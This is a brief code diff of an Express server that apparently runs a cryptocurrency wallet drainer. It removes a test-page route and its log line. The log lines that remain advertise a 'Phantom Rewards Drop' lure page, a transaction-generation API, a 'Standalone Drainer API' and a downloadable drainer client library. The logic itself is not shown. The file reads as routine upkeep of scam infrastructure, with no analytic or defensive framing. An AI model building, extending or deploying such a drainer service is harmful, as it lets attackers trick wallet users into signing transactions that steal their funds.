@@ -73,16 +73,10 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Serve test frontend from public directory
-app.get('/test', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'test-frontend.html'));
-});
-
 // Start server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on http://localhost:${PORT}`);
   console.log(`📱 Phantom Rewards Drop: http://localhost:${PORT}`);
-  console.log(`🧪 Frontend Test: http://localhost:${PORT}/test`);
   console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/generateTx`);
   console.log(`🔗 Standalone Drainer API: http://localhost:${PORT}/api/drainer`);
   console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
